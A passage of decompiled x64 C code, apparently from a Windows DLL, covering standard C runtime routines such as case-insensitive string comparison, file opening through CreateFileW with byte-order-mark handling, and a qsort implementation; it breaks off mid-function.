    "__int64 __fastcall sub_180032EE4(unsigned __int8 *a1, unsigned __int8 *a2, unsigned __int64 a3, __int128 *a4)",
    "{",
    "  unsigned __int64 v4; // rbx",
    "  unsigned __int8 *v5; // rdi",
    "  unsigned __int8 *v6; // rsi",
    "  __int64 result; // rax",
    "  __int64 v8; // r8",
    "  __int64 v9; // rax",
    "  int v10; // edx",
    "  __int64 v11; // rax",
    "  int v12; // ecx",
    "  _QWORD v13[3]; // [rsp+20h] [rbp-28h] BYREF",
    "  char v14; // [rsp+38h] [rbp-10h]",
    "",
    "  v4 = a3;",
    "  v5 = a2;",
    "  v6 = a1;",
    "  if ( a1 && a2 && a3 <= 0x7FFFFFFF )",
    "  {",
    "    if ( a3 )",
    "    {",
    "      sub_18001B674(v13, a4);",
    "      v8 = *(_QWORD *)(v13[1] + 272LL);",
    "      do",
    "      {",
    "        v9 = *v6++;",
    "        v10 = *(unsigned __int8 *)(v9 + v8);",
    "        v11 = *v5++;",
    "        v12 = *(unsigned __int8 *)(v11 + v8);",
    "        result = (unsigned int)(v10 - v12);",
    "        if ( v10 != v12 )",
    "          break;",
    "        if ( !v10 )",
    "          break;",
    "        --v4;",
    "      }",
    "      while ( v4 );",
    "      if ( v14 )",
    "        *(_DWORD *)(v13[0] + 936LL) &= ~2u;",
    "    }",
    "    else",
    "    {",
    "      return 0;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    *(_DWORD *)sub_18001A80C() = 22;",
    "    invalid_parameter_noinfo();",
    "    return 0x7FFFFFFF;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180032F94(__int64 a1, int a2, int a3, int a4, int *a5, int a6)",
    "{",
    "  unsigned int v7; // edi",
    "  __int64 v8; // rax",
    "  int v9; // [rsp+40h] [rbp-18h] BYREF",
    "  unsigned int v10; // [rsp+44h] [rbp-14h]",
    "",
    "  if ( !a5 || (*a5 = -1, !a1) || a6 && (a4 & 0xFFFFFE7F) != 0 )",
    "  {",
    "    *(_DWORD *)sub_18001A80C() = 22;",
    "    invalid_parameter_noinfo();",
    "    return 22;",
    "  }",
    "  else",
    "  {",
    "    v9 = 0;",
    "    v10 = 0;",
    "    v7 = sub_1800335A4((unsigned int)&v9, (_DWORD)a5, a1, a2, a3, a4, a6);",
    "    v10 = v7;",
    "    if ( v9 )",
    "    {",
    "      if ( v7 )",
    "      {",
    "        v8 = qword_18004D870[(__int64)*a5 >> 6];",
    "        *(_BYTE *)(v8 + 72LL * (*a5 & 0x3F) + 56) &= ~1u;",
    "      }",
    "      sub_18002E2A4(*a5);",
    "    }",
    "    if ( v7 )",
    "      *a5 = -1;",
    "    return v7;",
    "  }",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180033058(unsigned int a1, __int64 a2, int a3, _BYTE *a4)",
    "{",
    "  int v5; // ebx",
    "  int v7; // esi",
    "  int v9; // ecx",
    "  int v10; // edi",
    "  unsigned int v11; // eax",
    "  int v12; // ecx",
    "  int v13; // ecx",
    "  int v14; // eax",
    "  int v16; // eax",
    "  int v17; // eax",
    "  int v18; // [rsp+50h] [rbp+8h] BYREF",
    "",
    "  v5 = 0;",
    "  *a4 = 0;",
    "  v7 = a3;",
    "  if ( *(char *)(qword_18004D870[(__int64)(int)a1 >> 6] + 72LL * (a1 & 0x3F) + 56) >= 0 )",
    "    return 0;",
    "  if ( (a3 & 0x74000) == 0 )",
    "  {",
    "    v18 = 0;",
    "    if ( (unsigned int)sub_180035260(&v18) )",
    "    {",
    "      sub_18001A6B4();",
    "      __debugbreak();",
    "    }",
    "    if ( (v18 & 0x74000) != 0 )",
    "      v7 |= v18 & 0x74000;",
    "    else",
    "      v7 |= 0x4000u;",
    "  }",
    "  v9 = v7 & 0x74000;",
    "  v10 = 2;",
    "  if ( (v7 & 0x74000) == 0x4000 )",
    "  {",
    "    *a4 = 0;",
    "    goto LABEL_15;",
    "  }",
    "  if ( ((v9 - 0x10000) & 0xFFFFBFFF) == 0 )",
    "  {",
    "    if ( (v7 & 0x301) != 0x301 )",
    "      goto LABEL_15;",
    "LABEL_13:",
    "    *a4 = 2;",
    "    goto LABEL_15;",
    "  }",
    "  if ( ((v9 - 0x20000) & 0xFFFFBFFF) == 0 )",
    "    goto LABEL_13;",
    "  if ( ((v9 - 0x40000) & 0xFFFFBFFF) == 0 )",
    "    *a4 = 1;",
    "LABEL_15:",
    "  if ( (v7 & 0x70000) == 0 || (*(_BYTE *)a2 & 0x40) != 0 )",
    "    return 0;",
    "  v11 = *(_DWORD *)(a2 + 4) & 0xC0000000;",
    "  if ( v11 != 0x40000000 )",
    "  {",
    "    if ( v11 == 0x80000000 )",
    "      goto LABEL_32;",
    "    if ( v11 != -1073741824 )",
    "      return 0;",
    "  }",
    "  if ( *(_DWORD *)(a2 + 8) != 1 && *(_DWORD *)(a2 + 8) != 2 )",
    "  {",
    "    if ( *(_DWORD *)(a2 + 8) != 3 && *(_DWORD *)(a2 + 8) != 4 )",
    "    {",
    "      if ( *(_DWORD *)(a2 + 8) != 5 )",
    "        return 0;",
    "      goto LABEL_25;",
    "    }",
    "    if ( sub_1800294D0(a1, 0, 2u) )",
    "    {",
    "      if ( sub_1800294D0(a1, 0, 0) == -1 )",
    "        return *(unsigned int *)sub_18001A80C();",
    "      if ( (*(_DWORD *)(a2 + 4) & 0x80000000) == 0 )",
    "        return 0;",
    "LABEL_32:",
    "      v18 = 0;",
    "      v16 = sub_18002A0B4(a1, (__int16 *)&v18, 3u);",
    "      if ( v16 == -1 )",
    "        return *(unsigned int *)sub_18001A80C();",
    "      if ( v16 != 2 )",
    "      {",
    "        if ( v16 != 3 )",
    "          goto LABEL_42;",
    "        if ( v18 == 12565487 )",
    "        {",
    "          *a4 = 1;",
    "          return 0;",
    "        }",
    "      }",
    "      if ( (unsigned __int16)v18 == 65534 )",
    "      {",
    "        *(_DWORD *)sub_18001A80C() = 22;",
    "        return *(unsigned int *)sub_18001A80C();",
    "      }",
    "      if ( (unsigned __int16)v18 == 65279 )",
    "      {",
    "        if ( sub_1800294D0(a1, (LARGE_INTEGER)2LL, 0) != -1 )",
    "        {",
    "          *a4 = 2;",
    "          return 0;",
    "        }",
    "        return *(unsigned int *)sub_18001A80C();",
    "      }",
    "LABEL_42:",
    "      if ( sub_1800294D0(a1, 0, 0) != -1 )",
    "        return 0;",
    "      return *(unsigned int *)sub_18001A80C();",
    "    }",
    "  }",
    "LABEL_25:",
    "  v12 = (char)*a4;",
    "  v18 = 0;",
    "  v13 = v12 - 1;",
    "  if ( !v13 )",
    "  {",
    "    v10 = 3;",
    "    v14 = 12565487;",
    "LABEL_45:",
    "    v18 = v14;",
    "    while ( 1 )",
    "    {",
    "      v17 = sub_180028DA0(a1, (__int64)&v18 + v5, (unsigned int)(v10 - v5));",
    "      if ( v17 == -1 )",
    "        break;",
    "      v5 += v17;",
    "      if ( v10 <= v5 )",
    "        return 0;",
    "    }",
    "    return *(unsigned int *)sub_18001A80C();",
    "  }",
    "  if ( v13 == 1 )",
    "  {",
    "    v14 = 65279;",
    "    goto LABEL_45;",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800332D8(__int64 a1, int a2, int a3, char a4)",
    "{",
    "  int v8; // esi",
    "  int v9; // eax",
    "  int v10; // eax",
    "  int v11; // eax",
    "  int v12; // ebp",
    "  int v13; // ebp",
    "  int v14; // ebp",
    "  int v15; // ebp",
    "  int v17; // [rsp+58h] [rbp+10h] BYREF",
    "",
    "  *(_BYTE *)a1 = 0;",
    "  v8 = -1;",
    "  if ( (a2 & 3) != 0 )",
    "  {",
    "    if ( (a2 & 3) == 1 )",
    "    {",
    "      v9 = (a2 & 8) != 0 && (a2 & 0x70000) != 0 ? -1073741824 : 0x40000000;",
    "    }",
    "    else if ( (a2 & 3) == 2 )",
    "    {",
    "      v9 = -1073741824;",
    "    }",
    "    else",
    "    {",
    "      *(_DWORD *)sub_18001A80C() = 22;",
    "      invalid_parameter_noinfo();",
    "      v9 = -1;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    v9 = 0x80000000;",
    "  }",
    "  *(_DWORD *)(a1 + 4) = v9;",
    "  v10 = a2 & 0x700;",
    "  if ( (a2 & 0x700) != 0 )",
    "  {",
    "    switch ( v10 )",
    "    {",
    "      case 256:",
    "        v11 = 4;",
    "        goto LABEL_22;",
    "      case 512:",
    "LABEL_19:",
    "        v11 = 5;",
    "        goto LABEL_22;",
    "      case 768:",
    "        v11 = 2;",
    "        goto LABEL_22;",
    "    }",
    "    if ( v10 != 1024 )",
    "    {",
    "      if ( v10 == 1280 )",
    "      {",
    "LABEL_17:",
    "        v11 = 1;",
    "        goto LABEL_22;",
    "      }",
    "      if ( v10 != 1536 )",
    "      {",
    "        if ( v10 != 1792 )",
    "        {",
    "          *(_DWORD *)sub_18001A80C() = 22;",
    "          invalid_parameter_noinfo();",
    "          v11 = -1;",
    "          goto LABEL_22;",
    "        }",
    "        goto LABEL_17;",
    "      }",
    "      goto LABEL_19;",
    "    }",
    "  }",
    "  v11 = 3;",
    "LABEL_22:",
    "  *(_DWORD *)(a1 + 8) = v11;",
    "  v12 = a3 - 16;",
    "  if ( v12 )",
    "  {",
    "    v13 = v12 - 16;",
    "    if ( v13 )",
    "    {",
    "      v14 = v13 - 16;",
    "      if ( v14 )",
    "      {",
    "        v15 = v14 - 16;",
    "        if ( v15 )",
    "        {",
    "          if ( v15 == 64 )",
    "          {",
    "            v8 = *(_DWORD *)(a1 + 4) == 0x80000000;",
    "          }",
    "          else",
    "          {",
    "            *(_DWORD *)sub_18001A80C() = 22;",
    "            invalid_parameter_noinfo();",
    "          }",
    "        }",
    "        else",
    "        {",
    "          v8 = 3;",
    "        }",
    "      }",
    "      else",
    "      {",
    "        v8 = 2;",
    "      }",
    "    }",
    "    else",
    "    {",
    "      v8 = 1;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    v8 = 0;",
    "  }",
    "  *(_DWORD *)(a1 + 20) = 0;",
    "  *(_DWORD *)(a1 + 12) = v8;",
    "  *(_DWORD *)(a1 + 16) = 128;",
    "  if ( (a2 & 0x80u) != 0 )",
    "    *(_BYTE *)a1 |= 0x10u;",
    "  if ( (a2 & 0x8000) == 0 )",
    "  {",
    "    if ( (a2 & 0x74000) != 0 )",
    "      goto LABEL_39;",
    "    if ( (unsigned int)sub_180035260(&v17) )",
    "    {",
    "      sub_18001A6B4();",
    "      JUMPOUT(0x1800334DDLL);",
    "    }",
    "    if ( v17 != 0x8000 )",
    "LABEL_39:",
    "      *(_BYTE *)a1 |= 0x80u;",
    "  }",
    "  if ( (a2 & 0x100) != 0 && (a4 & ~(_BYTE)dword_18004DE30 & 0x80u) == 0 )",
    "    *(_DWORD *)(a1 + 16) = 1;",
    "  if ( (a2 & 0x40) != 0 )",
    "  {",
    "    *(_DWORD *)(a1 + 20) |= 0x4000000u;",
    "    *(_DWORD *)(a1 + 4) |= 0x10000u;",
    "    *(_DWORD *)(a1 + 12) |= 4u;",
    "  }",
    "  if ( (a2 & 0x1000) != 0 )",
    "    *(_DWORD *)(a1 + 16) |= 0x100u;",
    "  if ( (a2 & 0x2000) != 0 )",
    "    *(_DWORD *)(a1 + 20) |= 0x2000000u;",
    "  if ( (a2 & 0x20) != 0 )",
    "  {",
    "    *(_DWORD *)(a1 + 20) |= 0x8000000u;",
    "  }",
    "  else if ( (a2 & 0x10) != 0 )",
    "  {",
    "    *(_DWORD *)(a1 + 20) |= 0x10000000u;",
    "  }",
    "  return a1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800334E0(int a1)",
    "{",
    "  __int64 v1; // rbx",
    "  char v2; // cl",
    "  LARGE_INTEGER v3; // rdi",
    "  __int16 v5; // [rsp+30h] [rbp+8h] BYREF",
    "",
    "  v1 = a1;",
    "  v2 = *(_BYTE *)(qword_18004D870[v1 >> 6] + 72 * (v1 & 0x3F) + 56);",
    "  if ( (v2 & 0x48) == 0 && v2 < 0 )",
    "  {",
    "    v3 = sub_1800294D0(v1, (LARGE_INTEGER)-1LL, 2u);",
    "    if ( v3.QuadPart == -1 )",
    "    {",
    "      if ( *(_DWORD *)sub_18001A7EC() != 131 )",
    "        return *(unsigned int *)sub_18001A80C();",
    "    }",
    "    else",
    "    {",
    "      v5 = 0;",
    "      if ( !(unsigned int)sub_18002A0B4(v1, &v5, 1u)",
    "        && v5 == 26",
    "        && (unsigned int)((__int64 (__fastcall *)(_QWORD, _QWORD))sub_180035374)(",
    "                           (unsigned int)v1,",
    "                           (LARGE_INTEGER)v3.QuadPart) == -1",
    "        || sub_1800294D0(v1, 0, 0) == -1 )",
    "      {",
    "        return *(unsigned int *)sub_18001A80C();",
    "      }",
    "    }",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800335A4(__int64 a1, __int64 a2, _BYTE *a3, unsigned int a4, int a5, int a6, int a7)",
    "{",
    "  unsigned int v11; // r9d",
    "  unsigned int v12; // ebx",
    "  _BYTE v14[8]; // [rsp+48h] [rbp-21h] BYREF",
    "  _QWORD v15[3]; // [rsp+50h] [rbp-19h] BYREF",
    "  char v16; // [rsp+68h] [rbp-1h]",
    "  _QWORD v17[2]; // [rsp+70h] [rbp+7h] BYREF",
    "  XSAVE_FORMAT *lpMem; // [rsp+80h] [rbp+17h]",
    "  __int64 v19; // [rsp+88h] [rbp+1Fh]",
    "  __int64 v20; // [rsp+90h] [rbp+27h]",
    "  char v21; // [rsp+98h] [rbp+2Fh]",
    "",
    "  v17[0] = 0;",
    "  v17[1] = 0;",
    "  lpMem = 0;",
    "  v19 = 0;",
    "  v20 = 0;",
    "  v21 = 0;",
    "  sub_18001B674(v15, 0);",
    "  v11 = 65001;",
    "  if ( *(_DWORD *)(v15[1] + 12LL) == 65001 )",
    "  {",
    "    if ( v16 )",
    "      *(_DWORD *)(v15[0] + 936LL) &= ~2u;",
    "  }",
    "  else if ( (unsigned int)sub_180023678() )",
    "  {",
    "    if ( v16 )",
    "      *(_DWORD *)(v15[0] + 936LL) &= ~2u;",
    "    v11 = 0;",
    "  }",
    "  else",
    "  {",
    "    if ( v16 )",
    "      *(_DWORD *)(v15[0] + 936LL) &= ~2u;",
    "    v11 = 1;",
    "  }",
    "  if ( (unsigned int)sub_180021A20(a3, (__int64)v17, (__int64)v14, v11) )",
    "    v12 = -1;",
    "  else",
    "    v12 = sub_1800336F4(a1, a2, lpMem, a4, a5, a6, a7);",
    "  if ( v21 )",
    "    sub_180023374(lpMem);",
    "  return v12;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800336C0(int *a1, __int64 a2, int a3, int a4, int a5)",
    "{",
    "  return sub_180032F94(a2, a3, a4, a5, a1, 1);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800336F4(_DWORD *a1, int *a2, const WCHAR *a3, int a4, int a5, char a6)",
    "{",
    "  __int64 v10; // rax",
    "  __int64 v11; // xmm1_8",
    "  unsigned __int64 v12; // xmm0_8",
    "  int v14; // eax",
    "  DWORD dwCreationDisposition; // ecx",
    "  DWORD v16; // rdx^4",
    "  __int64 dwFlagsAndAttributes; // r14",
    "  HANDLE FileW; // rax",
    "  DWORD v19; // ebx",
    "  HANDLE v20; // r13",
    "  DWORD LastError; // eax",
    "  DWORD FileType; // eax",
    "  DWORD v23; // ebx",
    "  char v24; // r14",
    "  __int64 v25; // rax",
    "  __int64 v26; // rcx",
    "  unsigned int v27; // r14d",
    "  __int64 v28; // rcx",
    "  unsigned int v29; // ecx",
    "  __int64 v30; // rax",
    "  __int64 v31; // rax",
    "  HANDLE v32; // rdx",
    "  DWORD v33; // eax",
    "  _BYTE v34[8]; // [rsp+48h] [rbp-61h] BYREF",
    "  DWORD v35[4]; // [rsp+50h] [rbp-59h]",
    "  __int64 v36; // [rsp+60h] [rbp-49h]",
    "  char v37; // [rsp+68h] [rbp-41h]",
    "  __int64 v38; // [rsp+70h] [rbp-39h]",
    "  DWORD v39[2]; // [rsp+78h] [rbp-31h]",
    "  DWORD dwShareMode[2]; // [rsp+80h] [rbp-29h]",
    "  _BYTE SecurityAttributes[32]; // [rsp+88h] [rbp-21h] BYREF",
    "  __int128 v42; // [rsp+A8h] [rbp-1h] BYREF",
    "  __int64 v43; // [rsp+B8h] [rbp+Fh]",
    "",
    "  v10 = sub_1800332D8((__int64)&v42, a4, a5, a6);",
    "  v11 = *(_QWORD *)(v10 + 16);",
    "  *(_OWORD *)v35 = *(_OWORD *)v10;",
    "  v12 = _mm_srli_si128(*(__m128i *)v35, 8).m128i_u64[0];",
    "  v38 = v11;",
    "  v36 = v11;",
    "  *(_QWORD *)dwShareMode = HIDWORD(v12);",
    "  if ( HIDWORD(v12) == -1 )",
    "  {",
    "    *(_DWORD *)sub_18001A7EC() = 0;",
    "    *a2 = -1;",
    "    return *(unsigned int *)sub_18001A80C();",
    "  }",
    "  v14 = sub_18002E2CC();",
    "  *a2 = v14;",
    "  if ( v14 == -1 )",
    "  {",
    "    *(_DWORD *)sub_18001A7EC() = 0;",
    "    *a2 = -1;",
    "    *(_DWORD *)sub_18001A80C() = 24;",
    "    return *(unsigned int *)sub_18001A80C();",
    "  }",
    "  dwCreationDisposition = v35[2];",
    "  v16 = v35[1];",
    "  dwFlagsAndAttributes = (unsigned int)v36 | HIDWORD(v36);",
    "  *a1 = 1;",
    "  *(_DWORD *)SecurityAttributes = 24;",
    "  *(_QWORD *)&SecurityAttributes[8] = 0;",
    "  *(_DWORD *)&SecurityAttributes[16] = (a4 & 0x80) == 0;",
    "  *(_QWORD *)v39 = dwFlagsAndAttributes;",
    "  FileW = CreateFileW(",
    "            a3,",
    "            v16,",
    "            HIDWORD(v12),",
    "            (LPSECURITY_ATTRIBUTES)SecurityAttributes,",
    "            dwCreationDisposition,",
    "            dwFlagsAndAttributes,",
    "            0);",
    "  v19 = v35[1];",
    "  v20 = FileW;",
    "  if ( FileW == (HANDLE)-1LL )",
    "  {",
    "    if ( (v35[1] & 0xC0000000) != 0xC0000000",
    "      || (a4 & 1) == 0",
    "      || (v19 = v35[1] & 0x7FFFFFFF,",
    "          v35[1] &= ~0x80000000,",
    "          v20 = CreateFileW(",
    "                  a3,",
    "                  v35[1],",
    "                  HIDWORD(v12),",
    "                  (LPSECURITY_ATTRIBUTES)SecurityAttributes,",
    "                  v35[2],",
    "                  dwFlagsAndAttributes,",
    "                  0),",
    "          v20 == (HANDLE)-1LL) )",
    "    {",
    "      *(_BYTE *)(qword_18004D870[(__int64)*a2 >> 6] + 72LL * (*a2 & 0x3F) + 56) &= ~1u;",
    "      LastError = GetLastError();",
    "      sub_18001A780(LastError);",
    "      return *(unsigned int *)sub_18001A80C();",
    "    }",
    "  }",
    "  FileType = GetFileType(v20);",
    "  if ( !FileType )",
    "  {",
    "    v23 = GetLastError();",
    "    sub_18001A780(v23);",
    "    *(_BYTE *)(qword_18004D870[(__int64)*a2 >> 6] + 72LL * (*a2 & 0x3F) + 56) &= ~1u;",
    "    CloseHandle(v20);",
    "    if ( !v23 )",
    "      *(_DWORD *)sub_18001A80C() = 13;",
    "    return *(unsigned int *)sub_18001A80C();",
    "  }",
    "  v24 = v35[0];",
    "  if ( FileType == 2 )",
    "  {",
    "    v24 = LOBYTE(v35[0]) | 0x40;",
    "  }",
    "  else if ( FileType == 3 )",
    "  {",
    "    v24 = LOBYTE(v35[0]) | 8;",
    "  }",
    "  sub_18002E1E4(*a2, v20);",
    "  v25 = (__int64)*a2 >> 6;",
    "  v26 = *a2 & 0x3F;",
    "  v37 = v24 | 1;",
    "  LOBYTE(v35[0]) = v24 | 1;",
    "  *(_BYTE *)(qword_18004D870[v25] + 72 * v26 + 56) = v24 | 1;",
    "  *(_BYTE *)(qword_18004D870[(__int64)*a2 >> 6] + 72LL * (*a2 & 0x3F) + 57) = 0;",
    "  if ( (a4 & 2) != 0 )",
    "  {",
    "    v27 = sub_1800334E0(*a2);",
    "    if ( v27 )",
    "    {",
    "      v28 = (unsigned int)*a2;",
    "LABEL_21:",
    "      sub_18002A640(v28);",
    "      return v27;",
    "    }",
    "  }",
    "  v29 = *a2;",
    "  v42 = *(_OWORD *)v35;",
    "  v34[0] = 0;",
    "  v43 = v38;",
    "  v27 = sub_180033058(v29, (__int64)&v42, a4, v34);",
    "  v30 = *a2;",
    "  if ( v27 )",
    "  {",
    "    v28 = (unsigned int)v30;",
    "    goto LABEL_21;",
    "  }",
    "  *(_BYTE *)(qword_18004D870[v30 >> 6] + 72 * (v30 & 0x3F) + 57) = v34[0];",
    "  v31 = *a2;",
    "  *(_BYTE *)(qword_18004D870[v31 >> 6] + 72 * (v31 & 0x3F) + 61) ^= (*(_BYTE *)(qword_18004D870[v31 >> 6]",
    "                                                                              + 72 * (v31 & 0x3F)",
    "                                                                              + 61)",
    "                                                                   ^ BYTE2(a4))",
    "                                                                  & 1;",
    "  if ( (v37 & 0x48) == 0 && (a4 & 8) != 0 )",
    "    *(_BYTE *)(qword_18004D870[(__int64)*a2 >> 6] + 72LL * (*a2 & 0x3F) + 56) |= 0x20u;",
    "  if ( (v19 & 0xC0000000) == 0xC0000000 && (a4 & 1) != 0 )",
    "  {",
    "    CloseHandle(v20);",
    "    v35[1] = v19 & 0x7FFFFFFF;",
    "    v32 = CreateFileW(",
    "            a3,",
    "            v19 & 0x7FFFFFFF,",
    "            dwShareMode[0],",
    "            (LPSECURITY_ATTRIBUTES)SecurityAttributes,",
    "            v35[2],",
    "            v39[0],",
    "            0);",
    "    if ( v32 == (HANDLE)-1LL )",
    "    {",
    "      v33 = GetLastError();",
    "      sub_18001A780(v33);",
    "      *(_BYTE *)(qword_18004D870[(__int64)*a2 >> 6] + 72LL * (*a2 & 0x3F) + 56) &= ~1u;",
    "      sub_18002E40C(*a2);",
    "      return *(unsigned int *)sub_18001A80C();",
    "    }",
    "    *(_QWORD *)(qword_18004D870[(__int64)*a2 >> 6] + 72LL * (*a2 & 0x3F) + 40) = v32;",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180033AE4(unsigned __int16 a1, __int128 *a2)",
    "{",
    "  __int64 result; // rax",
    "  __int64 v3; // rcx",
    "  unsigned __int16 v4; // dx",
    "  int v5; // eax",
    "  __int64 v6; // [rsp+30h] [rbp-28h] BYREF",
    "  __int64 v7; // [rsp+38h] [rbp-20h]",
    "  char v8; // [rsp+48h] [rbp-10h]",
    "  unsigned __int16 v9; // [rsp+60h] [rbp+8h] BYREF",
    "  unsigned __int16 v10; // [rsp+70h] [rbp+18h] BYREF",
    "",
    "  v9 = a1;",
    "  result = 0xFFFF;",
    "  if ( a1 == 0xFFFF )",
    "    return result;",
    "  sub_18001B674(&v6, a2);",
    "  if ( *(_DWORD *)(v7 + 12) != 65001 )",
    "  {",
    "    v4 = v9;",
    "    if ( v9 < 0x100u )",
    "    {",
    "      if ( (*((_BYTE *)&unk_18003D120 + 2 * (unsigned __int8)v9 + 2) & 1) == 0 )",
    "      {",
    "        v4 = (unsigned __int8)v9;",
    "        goto LABEL_15;",
    "      }",
    "      v3 = (unsigned __int8)v9;",
    "      goto LABEL_10;",
    "    }",
    "    if ( !*(_QWORD *)(v7 + 312) )",
    "      goto LABEL_15;",
    "LABEL_13:",
    "    v5 = sub_1800355A0(*(_QWORD *)(v7 + 312), 256, (unsigned int)&v9, 1, (__int64)&v10, 1);",
    "    v4 = v9;",
    "    if ( v5 )",
    "      v4 = v10;",
    "    goto LABEL_15;",
    "  }",
    "  if ( v9 >= 0x80u )",
    "    goto LABEL_13;",
    "  if ( (*((_BYTE *)&unk_18003D120 + 2 * (unsigned __int8)v9 + 2) & 1) != 0 )",
    "  {",
    "    v3 = (unsigned __int8)v9;",
    "LABEL_10:",
    "    v4 = *(unsigned __int8 *)(*(_QWORD *)(v7 + 272) + v3);",
    "    goto LABEL_15;",
    "  }",
    "  v4 = (unsigned __int8)v9;",
    "LABEL_15:",
    "  if ( v8 )",
    "    *(_DWORD *)(v6 + 936) &= ~2u;",
    "  return v4;",
    "}",
    "",
    "",
    "void __fastcall sub_180033BE0(",
    "        unsigned __int64 a1,",
    "        unsigned __int64 a2,",
    "        unsigned __int64 a3,",
    "        int (__fastcall *a4)(unsigned __int64, _BYTE *))",
    "{",
    "  unsigned __int64 v6; // r13",
    "  _BYTE *v7; // r15",
    "  __int64 v8; // rcx",
    "  unsigned __int64 v9; // rbx",
    "  _BYTE *v10; // rbx",
    "  unsigned __int64 i; // rdi",
    "  unsigned __int64 v12; // r8",
    "  _BYTE *v13; // rdx",
    "  __int64 v14; // rbx",
    "  char v15; // cl",
    "  unsigned __int64 v16; // rbx",
    "  _BYTE *v17; // rsi",
    "  _BYTE *v18; // r8",
    "  unsigned __int64 v19; // r9",
    "  char v20; // cl",
    "  unsigned __int64 v21; // r8",
    "  _BYTE *v22; // rdx",
    "  unsigned __int64 v23; // r9",
    "  char v24; // cl",
    "  unsigned __int64 v25; // r8",
    "  _BYTE *v26; // rdx",
    "  __int64 v27; // r9",
    "  char v28; // cl",
    "  unsigned __int64 v29; // rbx",
    "  _BYTE *v30; // rdi",
    "  _BYTE *v31; // rbp",
    "  _BYTE *v32; // rdx",
    "  unsigned __int64 v33; // r9",
    "  char v34; // cl",
    "  _BYTE *v35; // rax",
    "  __int64 v36; // [rsp+20h] [rbp-448h]",
    "  _QWORD v37[124]; // [rsp+30h] [rbp-438h]",
    "",
    "  v6 = a1;",
    "  if ( (a1 || !a2) && a3 && a4 )",
    "  {",
    "    if ( a2 >= 2 )",
    "    {",
    "      v7 = (_BYTE *)(a1 + a3 * (a2 - 1));",
    "      v8 = 0;",
    "      v36 = 0;",
    "      while ( 1 )",
    "      {",
    "        while ( 1 )",
    "        {",
    "          v9 = (unsigned __int64)&v7[-v6] / a3 + 1;",
    "          if ( v9 <= 8 )",
    "          {",
    "            if ( (unsigned __int64)v7 > v6 )",
    "            {",
    "              do",
    "              {",
    "                v10 = (_BYTE *)v6;",
    "                for ( i = a3 + v6; i <= (unsigned __int64)v7; i += a3 )",
    "                {",
    "                  if ( a4(i, v10) > 0 )",
    "                    v10 = (_BYTE *)i;",
    "                }",
    "                v12 = a3;",
    "                v13 = v7;",
    "                if ( v10 != v7 )",
    "                {",
    "                  v14 = v10 - v7;",
    "                  do",
    "                  {",
    "                    v15 = v13[v14];",
    "                    v13[v14] = *v13;",
    "                    *v13++ = v15;",
    "                    --v12;",
    "                  }",
    "                  while ( v12 );",
    "                }",
    "                v7 -= a3;",
    "              }",
    "              while ( (unsigned __int64)v7 > v6 );",
    "              v8 = v36;",
    "            }",
    "            goto LABEL_19;",
    "          }",
    "          v16 = a3 * (v9 >> 1);",
    "          v17 = (_BYTE *)(v16 + v6);",
    "          if ( a4(v6, (_BYTE *)(v16 + v6)) > 0 )",
    "          {",
    "            v19 = a3;",
    "            v18 = (_BYTE *)(v16 + v6);",
    "            if ( (_BYTE *)v6 != v17 )",
    "            {",
    "              do",
    "              {",
    "                v20 = v18[-v16];",
    "                v18[-v16] = *v18;",
    "                *v18++ = v20;",
    "                --v19;",
    "              }",
    "              while ( v19 );",
    "            }",
    "          }",
    "          if ( ((int (__fastcall *)(unsigned __int64, _BYTE *, _BYTE *, unsigned __int64))a4)(v6, v7, v18, v19) > 0 )",
    "          {",
    "            v21 = a3;",
    "            v22 = v7;",
    "            if ( (_BYTE *)v6 != v7 )",
    "            {",
    "              v23 = v6 - (_QWORD)v7;",
    "              do",
    "              {",
    "                v24 = v22[v23];",
    "                v22[v23] = *v22;",
    "                *v22++ = v24;",
    "                --v21;",
    "              }",
    "              while ( v21 );",
    "            }",
    "          }",
    "          if ( ((int (__fastcall *)(unsigned __int64, _BYTE *, unsigned __int64))a4)(v16 + v6, v7, v21) > 0 )",
    "          {",
    "            v25 = a3;",
    "            v26 = v7;",
    "            if ( v17 != v7 )",
    "            {",
    "              v27 = v17 - v7;",
    "              do",
    "              {",
    "                v28 = v26[v27];",
    "                v26[v27] = *v26;",
    "                *v26++ = v28;",
    "                --v25;",
    "              }",
    "              while ( v25 );",
    "            }",
    "          }",
    "          v29 = v6;",
    "          v30 = v7;",
    "          while ( 1 )",
    "          {",
    "            if ( (unsigned __int64)v17 > v29 )",
    "            {",
    "              while ( 1 )",
    "              {",
    "                v29 += a3;",
    "                if ( v29 >= (unsigned __int64)v17 )",
    "                  break;",
    "                if ( ((int (__fastcall *)(unsigned __int64, _BYTE *, unsigned __int64))a4)(v29, v17, v25) > 0 )",
    "                  goto LABEL_39;",
    "              }",
    "            }",
    "            do",
    "              v29 += a3;",
    "            while ( v29 <= (unsigned __int64)v7",
    "                 && ((int (__fastcall *)(unsigned __int64, _BYTE *, unsigned __int64))a4)(v29, v17, v25) <= 0 );",
    "            do",
    "            {",
    "LABEL_39:",
    "              v31 = v30;",
    "              v30 -= a3;",
    "            }",
    "            while ( v30 > v17 && a4((unsigned __int64)v30, v17) > 0 );",
    "            if ( (unsigned __int64)v30 < v29 )",
    "              break;",
    "            v25 = a3;",
    "            v32 = v30;",
    "            if ( v30 != (_BYTE *)v29 )",
    "            {",
    "              v33 = v29 - (_QWORD)v30;",
    "              do",
    "              {",
    "                v34 = v32[v33];",
    "                v32[v33] = *v32;",
    "                *v32++ = v34;",
    "                --v25;",
    "              }",
    "              while ( v25 );",
    "            }",
    "            v35 = (_BYTE *)v29;",
    "            if ( v17 != v30 )",
    "              v35 = v17;",
    "            v17 = v35;",
    "          }",
    "          if ( v17 < v31 )",
    "          {",
    "            while ( 1 )",
    "            {",
    "              v31 -= a3;",
    "              if ( v31 <= v17 )",
    "                break;",
    "              if ( a4((unsigned __int64)v31, v17) )",
    "                goto LABEL_54;",
    "            }",
    "          }",
    "          do",
    "            v31 -= a3;",
